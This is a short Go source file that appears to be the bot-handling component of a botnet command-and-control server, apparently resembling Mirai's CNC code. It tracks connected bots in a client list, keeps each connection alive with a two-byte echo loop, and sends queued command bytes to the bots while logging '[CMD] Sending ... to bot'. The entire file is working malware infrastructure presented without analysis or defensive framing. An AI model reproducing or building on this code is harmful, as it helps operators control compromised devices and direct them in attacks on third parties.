package main

import (
    "fmt"
    "net"
    "time"
)

type Bot struct {
    uid     int
    conn    net.Conn
    version byte
    source  string
}

func NewBot(conn net.Conn, version byte, source string) *Bot {
    return &Bot{-1, conn, version, source}
}

func (this *Bot) Handle() {
    clientList.AddClient(this)
    defer clientList.DelClient(this)

    buf := make([]byte, 2)
    for {
        this.conn.SetDeadline(time.Now().Add(180 * time.Second))
        if n,err := this.conn.Read(buf); err != nil || n != len(buf) {
            return
        }
        if n,err := this.conn.Write(buf); err != nil || n != len(buf) {
            return
        }
    }
}

func (this *Bot) QueueBuf(buf []byte) {
    fmt.Printf("[CMD] Sending %d bytes to bot %s (%s)\n", len(buf), this.conn.RemoteAddr(), this.source)
    this.conn.Write(buf)
}
